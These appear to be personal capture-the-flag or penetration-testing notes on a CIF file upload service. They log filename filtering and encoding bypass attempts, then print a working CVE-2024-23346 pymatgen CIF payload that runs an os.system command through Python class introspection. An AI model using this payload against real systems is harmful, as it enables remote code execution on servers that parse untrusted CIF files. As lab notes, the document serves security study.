## FILE NAME FILTERING

- FIle must end with .cif extension
- Mappings between and special characters can be seen in the following (payload was exa\$variable\$). **-> Speciall characters are filtered** **-> more specifically since this is converted to url encoding the % are filtered out, so it probably takes whatever is in the url string directly and any special non url character is ingored**. The only ones not ignored are _, -, .
- Uploading various files with same name results in different files being created, so probably the name is not used in the file system directory.

## FILE CONTENT FILTERING

- site does not seem to filter the contents of the file being sent (anything is valid), but then when trying to access anything that is not a cif file it crashes.
- sending more than one file ignore the second one 

## ATTEMPTED BYPASSES

**filename**

Attempted to see behaviour of upload functionality with names with special characters when under specified conditions. Payload was `filename="exa§s§.cif"`. (for all writable ascii characters)

- simple sending with no encoding
- sending in url encoded
- sending in hex
- sending in standard (by burpsuite) url encoding

so far no results 

**uuid** at /structure/uuid

There is an uuid being created to identify each uploaded file, so i tried the same

- sending ascii with no encoding
- sending ascii with hex encoding -> no luck so far
- sending ascii in url encoding

**uuid** at /structure/uuid

- ascii with no encoding

## REMOTE CODE EXECUTION + RCE

The code is vulnerable to CVE-2024-23346, by uploading the following we can get RCE

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

We are now (somewhat because i couldn't get the shell working) [[RCE]]